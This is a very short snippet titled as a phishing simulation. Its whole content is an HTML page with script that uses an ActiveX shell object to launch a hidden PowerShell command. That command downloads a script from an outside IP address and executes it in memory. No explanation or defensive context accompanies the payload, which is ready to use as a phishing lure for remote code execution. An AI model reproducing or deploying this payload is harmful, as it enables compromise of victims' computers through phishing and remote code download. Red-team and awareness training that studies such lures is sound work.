### Fundamental Phishing Simulation


```
<html>
<script>	
    	var Data = "powershell.exe -nop -w hidden -c \"IEX((new-object net.webclient).downloadstring('http://192.168.100.1/a'));\"";
	var Value = new ActiveXObject("WScript.shell");
	Value.run(Data );
</script>
</html>

```
